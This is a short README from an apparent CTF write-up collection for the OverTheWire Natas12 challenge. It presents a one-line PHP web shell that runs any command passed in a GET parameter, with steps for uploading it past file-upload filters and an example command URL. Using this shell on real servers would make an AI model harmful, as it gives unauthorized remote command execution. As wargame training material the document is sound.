## 🔐 bypass.php

**Created:** 2025-06-03  
**Author:** Itacarambi  
**Challenge:** [OverTheWire — Natas12](https://github.com/ItacarambiSec/CTFs/blob/main/OverTheWire/Natas/Natas12/Readme.md)

---

## 🎯 Purpose

This script serves as a basic web shell, designed specifically for Remote Code Execution (RCE). It was used in the Natas12 challenge to execute arbitrary commands on the remote server after bypassing file upload restrictions. It receives a command via a GET parameter (`cmd`) and executes it using PHP's `system()` function, displaying the output directly on the web page.   

---

## ⚙️ Usage

This script must be uploaded to a vulnerable web server, typically via a file upload vulnerability.  

1. Upload: After bypassing upload filters (as demonstrated in Natas12 by manipulating the file name extension), upload this script to a web-accessible directory on the target server.  
2. Execute: Access the uploaded script via its URL in the browser, appending the desired command as a GET parameter.  

Example: `http://[target_url]/upload/[script_name].php?cmd=ls%20-la` 

## 💻 Script

```php
<?php system($_GET['cmd']); ?>
```
  

